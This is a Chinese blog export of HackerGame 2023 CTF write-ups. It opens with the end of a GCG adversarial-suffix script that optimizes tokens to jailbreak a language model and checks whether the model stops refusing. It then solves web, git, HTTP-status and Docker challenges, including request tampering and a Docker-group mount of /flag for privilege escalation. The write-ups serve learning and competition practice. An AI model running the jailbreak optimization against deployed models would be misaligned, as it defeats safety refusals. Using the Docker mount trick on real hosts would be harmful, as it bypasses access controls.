</span><br><span class="line">    <span class="comment"># 步骤3：根据坐标梯度采样一批新的tokens。</span></span><br><span class="line">    <span class="comment"># 注意我们只需要那些使损失最小化的tokens。</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.1：切片输入以定位对抗性后缀。</span></span><br><span class="line">        adv_suffix_tokens = input_ids[suffix_manager._control_slice].to(device)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.2：随机采样一批替换tokens。</span></span><br><span class="line">        new_adv_suffix_toks = sample_control(adv_suffix_tokens, </span><br><span class="line">                       coordinate_grad, </span><br><span class="line">                       batch_size, </span><br><span class="line">                       topk=topk, </span><br><span class="line">                       temp=<span class="number">1</span>, </span><br><span class="line">                       not_allowed_tokens=not_allowed_tokens)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.3：确保所有对抗性候选者有相同数量的tokens。</span></span><br><span class="line">        <span class="comment"># 因为tokenizers不是可逆的，Encode(Decode(tokens))可能产生不同的tokenization。</span></span><br><span class="line">        <span class="comment"># 我们确保tokens数量不变，以防止内存持续增长并造成OOM（内存溢出）。</span></span><br><span class="line">        new_adv_suffix = get_filtered_cands(tokenizer, </span><br><span class="line">                                            new_adv_suffix_toks, </span><br><span class="line">                                            filter_cand=<span class="literal">True</span>, </span><br><span class="line">                                            curr_control=adv_suffix)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤3.4：在这些候选者上计算损失，并取最小值。</span></span><br><span class="line">        logits, ids = get_logits(model=model, </span><br><span class="line">                                 tokenizer=tokenizer,</span><br><span class="line">                                 input_ids=input_ids,</span><br><span class="line">                                 control_slice=suffix_manager._control_slice, </span><br><span class="line">                                 test_controls=new_adv_suffix, </span><br><span class="line">                                 return_ids=<span class="literal">True</span>,</span><br><span class="line">                                 batch_size=<span class="number">512</span>)  <span class="comment"># 如果发生OOM，请减少这个数字。</span></span><br><span class="line"></span><br><span class="line">        losses = target_loss(logits, ids, suffix_manager._target_slice)</span><br><span class="line"></span><br><span class="line">        best_new_adv_suffix_id = losses.argmin()</span><br><span class="line">        best_new_adv_suffix = new_adv_suffix[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        current_loss = losses[best_new_adv_suffix_id]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用最佳候选者更新运行中的对抗性后缀</span></span><br><span class="line">        adv_suffix = best_new_adv_suffix</span><br><span class="line">        <span class="comment"># 检查是否成功进行了攻击</span></span><br><span class="line">        is_success = check_for_attack_success(model, </span><br><span class="line">                                 tokenizer,</span><br><span class="line">                                 suffix_manager.get_input_ids(adv_string=adv_suffix).to(device), </span><br><span class="line">                                 suffix_manager._assistant_role_slice, </span><br><span class="line">                                 test_prefixes)</span><br></pre></td></tr></table></figure>

<p>官方给的示例代码中,填补上了 import 部分的代码,然后将用户输入的部分滞空,后缀设置为各自对应最大长度的 ‘!’</p>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>最后生成出来的效果如下:</p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-4.png"></p>
<p><img src="/2023/11/05/HackerGame2023-LLM/image-3.png"></p>
]]></content>
      <categories>
        <category>HackerGame</category>
        <category>2023</category>
      </categories>
      <tags>
        <tag>LLM</tag>
      </tags>
  </entry>
  <entry>
    <title>【HackerGame2023】 WriteUp</title>
    <url>/2023/11/04/HackerGame2023/</url>
    <content><![CDATA[<h1 id="HackerGame-2023-WriteUp"><a href="#HackerGame-2023-WriteUp" class="headerlink" title="HackerGame 2023 WriteUp"></a>HackerGame 2023 WriteUp</h1><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>今年 hackergame 圆满结束，很享受的一次旅程（同时也有点折磨 QAQ），hackergame 这一个星期 ddl 挺多的，所以本次名次并不高，校内 15 名，总排名 226，这篇博客记录的不仅仅是自己做出来的题目的 WP，同时也对官方题解和我感兴趣的题目做一个 log，学习多点知识。</p>
<h2 id="WP-部分"><a href="#WP-部分" class="headerlink" title="WP 部分"></a>WP 部分</h2><h3 id="HackerGame-启动"><a href="#HackerGame-启动" class="headerlink" title="HackerGame 启动"></a>HackerGame 启动</h3><p>签到题，打开题目后让你大声喊出 hackergame 启动！要求准确率到达百分之 99.99%，这是不可能的，上传的时候发现他是在 url 传参的，改一下参数(simularity&#x3D;99.999)就过了。</p>
<p><img src="/2023/11/04/HackerGame2023/1.png"></p>
<h3 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h3><p>今年猫咪小测一共有四道题：</p>
<p><code>1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？（是一个非负整数） </code></p>
<p>答：这道题给了提示是一个非负整数，而且图书馆不会很高，直接 0-20 爆破就行了。</p>
<p><code>2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？（是一个非负整数） </code></p>
<p>找学术论文这里用中文一定是不可行的，用 chatgpt 翻译成英语：“The upper limit of the density of chickens in the observable universe”，之后再谷歌搜索即可得到论文，答案是 23。</p>
<p><code>3. 为了支持 TCP BBR 拥塞控制算法，在编译 Linux 内核时应该配置好哪一条内核选项？(输入格式为 CONFIG_XXXXX)</code></p>
<p>问 chatgpt，答案为 CONFIG_TCP_CONG_BBR。</p>
<p><code>4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 MyPY mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？（会议的大写英文简称，比如 ISCA、CCS、ICML。）</code></p>
<p>我的做法是直接爆破所有的和 python 有关的学术会议，最后爆破出来是 ECOOP。官方题解则是以”python type check mypy halting problem”为关键词搜索对应的学术论文。</p>
<h3 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h3><p>进去后，提示我们要翻到最底下。<br><img src="/2023/11/04/HackerGame2023/2.png"></p>
<p>我们直接 bp 抓包，看源代码，发现 flag 是 token 的哈希加密值，直接在本地复现即可：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> token =</span><br><span class="line">  <span class="string">&#x27;340:MEQCID15NFRrTG68kB61LStGU/dVdE7xfkJYGlzMvO+UEfRyAiBZn5rm5XJZ4RBT54m7Qdu/fLoKzne1MGfiXFaPbNKuhQ==&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>(</span><br><span class="line">  <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span></span><br><span class="line">);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>);</span><br></pre></td></tr></table></figure>

<h3 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h3><p>一年一度的社工题，这里分享我的做法。</p>
<p><code>题目1-2： 1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd） 2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研s究所缩写是什么？</code></p>
<p>首先确认时间是在暑假发生，然后仔细观察图片，发现有：</p>
<p><img src="/2023/11/04/HackerGame2023/3.png"></p>
<p>谷歌一搜发现是学术会议 statphys28，一搜发现时间在 8 月 7 日-8 月 11 日举行，举行地点是东京，其实就已经确认了学长是在东京大学读书，时间一个很小的范围，把第二道题确认下来爆破。</p>
<p>第二道题给了一个奖牌，上面有个人名：<strong>M.KOSHIBA</strong></p>
<p>搜索后发现是诺贝尔物理学奖获得者，这里就需要寻找东京大学诺贝尔物理学奖获得者最年轻的那位：</p>
<p><img src="/2023/11/04/HackerGame2023/4.png"></p>
<p>发现是梶田隆章，研究所的缩写为 ICRR，然后根据这个一起去爆破第一问的时间，确认答案为：</p>
<p><strong>2023-8-10</strong>和<strong>ICRR</strong></p>
<p><code>题目3-4 3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？ 4、学长购买自己的博物馆门票时，花费了多少日元？</code></p>
<p>对于第 3 题，谷歌对帐篷图片识图，发现是上野公园，谷歌搜索上野公园 2023 年 8 月 10 日的活动，看到有个梅酒节活动，里面有 staff 大募集，能拿到问卷编号。</p>
<p><img src="/2023/11/04/HackerGame2023/5.png"></p>
<p>对于第 4 题，上野公园的博物馆基本可以确定是东京国立博物馆，直接去搜他的官网，发现他是对大学生免费的，所以答案就是<strong>0</strong></p>
<p><code>题目5-6 5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？(请用简体中文回答，四个汉字) 6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</code></p>
<p>对于第 5 题，我当时猜测集合地点可能是坐船的地点，然后把浅草那边所有的码头的枚举了都不对，然后仔细看看，发现“学长即将开始他的学术之旅”，就又回去看了看 statphys28，发现他是在晚上举行的，statphys28 的官网有谷歌地图定位：</p>
<p><img src="/2023/11/04/HackerGame2023/6.png"></p>
<p>进去后发现是在<strong>安田讲堂</strong>：</p>
<p><img src="/2023/11/04/HackerGame2023/7.png"></p>
<p>对于第 6 题，直接在推特搜”ボタン＆カフリンクス”</p>
<p><img src="/2023/11/04/HackerGame2023/8.png"></p>
<p>可以确定是个熊猫，第二小问就比较离谱了，我当时没注意看是<strong>出站附近</strong>，以为是上野站附近的广告牌有 3d 小动物，看了很久的街景都没发现有（心想这地方那么村，怎么会有超大的 3d 广告牌），后来没头绪了仔细看了一下，发现是出站，他的第三张图片是去了任天堂马里奥世界，在涩谷，那就很简单了，在涩谷站出站每小时都会顽皮出现的那只 3D 动物就是<strong>秋田犬</strong></p>
<h3 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h3><p>这道简单题卡了我挺久 QAQ，进去后抓包看他 script.js 的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">setMove</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (board[x][y] != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (frozen) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line">  <span class="keyword">let</span> data = &#123; <span class="attr">x</span>: x, <span class="attr">y</span>: y &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(errorHandler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>仔细思考发现，他这个下棋的判断逻辑是在前端就已经写好了，即<strong>他是通过前端组件对棋盘进行判断的</strong>，这样的话我们直接重放 api 传合法的参数，就能把 ai 下的棋子篡改成我们的棋子，获得 flag：</p>
<p><img src="/2023/11/04/HackerGame2023/9.png"></p>
<h3 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h3><p>这道题我居然没做出来，真的就是没看提示（谷歌亲儿子），我以为是 png 隐写，结果是 pixel 的漏洞，谷歌 pixel 自带的截图编辑工具截出来的图，我们是可以把它已经裁剪过的截图给复原的，用网站：<br><a href="https://acropalypse.app/">https://acropalypse.app</a></p>
<p><img src="/2023/11/04/HackerGame2023/10.png"></p>
<h3 id="组委会模拟器"><a href="#组委会模拟器" class="headerlink" title="组委会模拟器"></a>组委会模拟器</h3><p>Web 编程题，这里需要注意的是，在发送报文的时候，不要等待获取了响应之后再发新的报文，发送了一个报文后马上要<strong>开一个新的线程</strong>去发下一个报文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 session</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">session.cookies.<span class="built_in">set</span>(<span class="string">&quot;session&quot;</span>, <span class="string">&quot;eyJ0b2tlbiI6IjM0MDpNRVFDSUQxNU5GUnJURzY4a0I2MUxTdEdVL2RWZEU3eGZrSllHbHpNdk8rVUVmUnlBaUJabjVybTVYSlo0UkJUNTRtN1FkdS9mTG9Lem5lMU1HZmlYRmFQYk5LdWhRPT0ifQ.ZT4eFw.eaokXgOWqIaaKVpIijCDrvuxRLo&quot;</span>, domain=<span class="string">&quot;202.38.93.111&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取消息</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getMessages&quot;</span>)</span><br><span class="line">data = response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取所有 hack[...] 格式的消息及其 delay</span></span><br><span class="line">messages = []</span><br><span class="line"><span class="keyword">for</span> i, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[<span class="string">&quot;messages&quot;</span>]):</span><br><span class="line">    text = message[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">    delay = message[<span class="string">&quot;delay&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">match</span> := re.search(<span class="string">r&#x27;hack\[\w+\]&#x27;</span>, text)):</span><br><span class="line">        messages.append((i, delay, <span class="keyword">match</span>.group()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对消息按 delay 排序</span></span><br><span class="line">messages.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除消息的函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_message</span>(<span class="params">message</span>):</span><br><span class="line">    response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/deleteMessage&quot;</span>, json=&#123;<span class="string">&quot;id&quot;</span>: message[<span class="number">0</span>]&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Deleted message:&quot;</span>, message[<span class="number">2</span>], <span class="string">&quot;| Response:&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送删除请求</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(messages)):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 等待 delay[i] - delay[i-1] 时间</span></span><br><span class="line">        time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,messages[i][<span class="number">1</span>] - messages[i-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">    <span class="comment"># 开启新线程来发送删除请求</span></span><br><span class="line">    threading.Thread(target=delete_message, args=(messages[i],)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待最后一个消息被删除</span></span><br><span class="line">time.sleep(<span class="built_in">max</span>(<span class="number">0</span>,<span class="number">3</span> - messages[-<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 flag</span></span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment">#等待所有线程运行完毕</span></span><br><span class="line">response = session.post(<span class="string">&quot;http://202.38.93.111:10021/api/getflag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, response.text&#125;</span><br></pre></td></tr></table></figure>

<p>跑完就能获取到 flag 了。</p>
<p>这里需要探讨一下官方的做法。</p>
<p>官方的做法是在浏览器里嵌入脚本：他这里的脚本就是每隔 100 毫秒查找出网页中包含 flag 的所有可点击的消息元素，然后点击它。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(</span><br><span class="line">  <span class="function">() =&gt;</span></span><br><span class="line">    <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.fakeqq-message__bubble&#x27;</span>))</span><br><span class="line">      .<span class="title function_">filter</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;hack[&#x27;</span>) != -<span class="number">1</span>)</span><br><span class="line">      .<span class="title function_">forEach</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> element.<span class="title function_">click</span>()),</span><br><span class="line">  <span class="number">100</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>“右键检查或按下 F12 键打开浏览器的开发者工具，选择「控制台」。将该脚本粘贴到控制台中，刷新页面（以重新开始题目）后按下回车执行脚本，就能自动撤回了。所有消息加载完毕后再稍等几秒，即可看到真正的 flag。”</p>
<h3 id="虫"><a href="#虫" class="headerlink" title="虫"></a>虫</h3><p>满扫描电视，SSTV 图片传输，这里可以直接使用解码的脚本解码，跑出来直接就有 flag 了。</p>
<p>官方的解法使用解码软件，Linux 上的 QSSTV，然后使用 PipeWire 将播放器音频连接到 QSSTV 输入，解码获得到 flag。</p>
<h3 id="JSON-⊂-YAML"><a href="#JSON-⊂-YAML" class="headerlink" title="JSON ⊂ YAML?"></a>JSON ⊂ YAML?</h3><p>题目：</p>
<p>你知道吗？Hackergame 出题时，每道题都需要出题人用 YAML 格式写下题目的关键信息。然而，每年总有一些出题人在编写 YAML 文件时被复杂的语法规则弄得头疼不已。</p>
<p>这天小 Z 又找到小 W 说：「我昨天写 YAML 时，又花了半天研究 YAML 的规范，YAML 好难啊！」</p>
<p>小 W 惊讶道：「怎么会有人不会写 YAML 呢？只要你会写 JSON 就会写 YAML 呀，因为任何合法的 JSON 本身就是合法的 YAML。」</p>
<p>小 Z 听闻这番言论后当场表示怀疑，立刻说出了一个字符串，JSON 和 YAML 解析出的含义存在差异。小 W 研究了一番才发现，这是因为很多主流的 YAML 库仍然是 YAML 1.1 的，它没有这个性质。他不得不承认：「好吧，这个性质只适用于 YAML 1.2。」</p>
<p>小 Z 笑了：「别提 YAML 1.2 了，它遇到合法的 JSON 都有可能报错。」</p>
<p>这个题目很有意思，就是 JSON 和 YAML 文件合法性的检查，要找两个，分别是</p>
<ul>
<li>JSON 和 YAML1.1</li>
<li>JSON 和 YAML1.2</li>
</ul>
<p>JSON 和 YAML 都是一种序列化格式。对于 JSON 和 YAML1.1：</p>
<p>我们先来对比 JSON 和 YAML1.1 的格式，JSON 中的数字格式是严格额，不能用前导正号，前导 0，小数点后面必须有数字。而 YAML1.1 是很宽松的，并没有一个确定的规则来决定一个未标注类型的字符串应该被解释成扫描类型，对于科学计数法，它<strong>强调小数点是必须的</strong>，所以在这个题中，可以构建<strong>1e1</strong>来获得 flag，在 JSON 中它会被解释成 10，而在 YAML1.1 中就是 1e1 这个字符串，因为他没有小数点。</p>
<p>官方给的解释中，提到了两条规则：</p>
<ol>
<li>是否有小数点</li>
<li>指数部分是否有正负号</li>
</ol>
<p>这两条规则都可以导致 JSON 和 YAML 解释不一样。</p>
<p>对于 JSON 和 YAML1.2：</p>
<p>YAML1.2 中明确规定了在遇到重复的键时必须报错，所以这里绕过比较简单，就是构造两个键名一样的参数即可。</p>
<p>最后结果：</p>
<p><img src="/2023/11/04/HackerGame2023/11.png" alt="Alt text"></p>
<h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git"></a>Git? Git</h3><p>题目：<br>「幸亏我发现了……」马老师长吁了一口气。</p>
<p>「马老师，发生甚么事了？」马老师的一位英国研究生问。</p>
<p>「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」</p>
<p>「这样啊，那太好了。」研究生说。</p>
<p>马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟…</p>
<p>我的方法简单粗暴，就是写一段脚本遍历所有 git 对象，然后打印出来，看看长不长，不长的话直接在里面找 flag，在本地文件夹 touch 建立一个文件，用 vim 打开，复制脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">objects_dir=<span class="string">&quot;.git/objects&quot;</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>); <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;info&quot;</span> ] &amp;&amp; [ <span class="string">&quot;<span class="variable">$dir</span>&quot;</span> != <span class="string">&quot;pack&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> file <span class="keyword">in</span> $(<span class="built_in">ls</span> <span class="variable">$objects_dir</span>/<span class="variable">$dir</span>); <span class="keyword">do</span></span><br><span class="line">          object_hash=<span class="string">&quot;$dir<span class="variable">$file</span>&quot;</span></span><br><span class="line">          object_content=$(git cat-file -p <span class="variable">$object_hash</span> 2&gt;/dev/null)</span><br><span class="line">          <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;Object <span class="variable">$object_hash</span>:&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$object_content</span>&quot;</span></span><br><span class="line">              <span class="built_in">echo</span> <span class="string">&quot;----------------------------------------&quot;</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>打印出来之后找到 flag。</p>
<p>官方题解是先通过 <code>git reflog</code> 查看完整操作历史，然后找到他最后一次的提交 hash，用 <code>git reset</code>回退到这次提交，查看 <code>README.md</code> 文件获得。</p>
<h3 id="HTTP-集邮册"><a href="#HTTP-集邮册" class="headerlink" title="HTTP 集邮册"></a>HTTP 集邮册</h3><p>题目：<br>本题中，你可以向一个 nginx 服务器（对应的容器为默认配置下的 nginx:1.25.2-bookworm）发送 HTTP 请求。你需要获取到不同的 HTTP 响应状态码以获取 flag，其中：</p>
<p>获取第一个 flag 需要收集 5 种状态码；<br>获取第二个 flag 需要让 nginx 返回首行无状态码的响应（不计入收集的状态码中）；<br>获取第三个 flag 需要收集 12 种状态码。<br>关于无状态码的判断逻辑如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">crlf = buf.find(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> buf.strip() != <span class="string">b&quot;&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> crlf == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;No CRLF found&quot;</span>)</span><br><span class="line">        status_line = buf[:crlf]</span><br><span class="line">        http_version, status_code, reason_phrase = status_line.split(<span class="string">b&quot; &quot;</span>, <span class="number">2</span>)</span><br><span class="line">        status_code = <span class="built_in">int</span>(status_code)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        buf += <span class="string">&quot;（无状态码）&quot;</span>.encode()</span><br><span class="line">        status_code = <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>先来说说第二个 flag 的获得方式，根据上面这个代码，它查找第一个<code>\r\n</code>换行符时会尝试解析状态行，如何让他不返回状态码呢，这里我做的时候就是 fuzz 出来的，一个个试，其实不知道他的原理，看了官方文档才知道，构造 payload：</p>
<p><code>GET /\r\n</code></p>
<p>一般的 HTTP 头是通过两个空格去分割三个字符串,如果剩下两个空格就会回退到 HTTP&#x2F;0.9,上面这个 payload发送的就是 HTTP&#x2F;0.9 请求，这个请求只支持 GET，响应就直接响应文件内容，这样的请求没有状态码。即可获得 flag</p>
<p>第一个 flag 和第三个 flag，我构造的 payload 和原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /50x.html HTTP/1.1\r\nHost: localhost\r\nIf-None-Match: &quot;64dbafc8-1f1&quot;\r\n\r\n</span><br><span class="line">返回 304，这里需要获取资源的 e-tag, 304代表文件在指定条件下没有修改过。</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10000000\r\n\r\n</span><br><span class="line">返回 413，超出Content的范围</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nIf-Match: &quot;12345&quot;\r\n\r\n</span><br><span class="line">返回 412，发送一个带有失败前提条件的请求，这里用If-Match尝试去匹配etag，匹配失败就会返回412</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 411，没有 Content-Length 头</span><br><span class="line"></span><br><span class="line">PUT /index.html HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 405，PUT方法被禁止</span><br><span class="line"></span><br><span class="line">GET /a HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 404</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 400，不符合HTTP格式要求</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nExpect: 100-continue\r\n\r\n</span><br><span class="line">返回 100，nginx 只支持 100-continue 的 expect 回带，这里会返回 100-continue，100-continue代表服务器希望客户端继续请求或者忽略</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 200</span><br><span class="line"></span><br><span class="line">GET / HTTP/5.5\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 505，不支持该 http 方法</span><br><span class="line"></span><br><span class="line">GET /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... HTTP/1.1\r\nHost: localhost\r\n\r\n</span><br><span class="line">返回 414，请求头太长</span><br><span class="line"></span><br><span class="line">GET / HTTP/1.1\r\nHost: localhost\r\nRange: bytes=1000-500\r\n\r\n</span><br><span class="line">返回 416，资源范围不合法</span><br></pre></td></tr></table></figure>

<p>这里官方还提到了一种，他自己也漏了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Transfer-Encoding: gzip\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br><span class="line">返回501，代表服务器不支持该功能，nginx里只支持chunked分块encoding，Transfer-Encoding这里换成chunked以外的都行</span><br></pre></td></tr></table></figure>

<h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><p>很简单的 Docker 提权，先简单讲一下 docker，如果一个用户被加入到 docker 的用户组，那么他们可以运行 docker 的命令而无需 sudo，这会引入安全问题，如果用户可以使用 docker 命令，那么他们实际上就拥有了访问主机上任意文件的能力，他们可以挂载主机上的任何目录到他的启动容器中。这道题中就算 flag 是软连接，也可以创建一个新的 docker 容器将 flag 指向的真实路径挂在为容器内的卷，操作如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 使用 docker 创建一个新容器并挂载 /flag</span><br><span class="line"># /flag 是我们想要读取的文件</span><br><span class="line"># /mnt 是容器内部的挂载点</span><br><span class="line">docker run -v /flag:/mnt/flag -it alpine /bin/sh</span><br><span class="line"># 在容器内读取挂载的 /flag 文件</span><br><span class="line">cat /mnt/flag</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="/2023/11/04/HackerGame2023/12.png"></p>
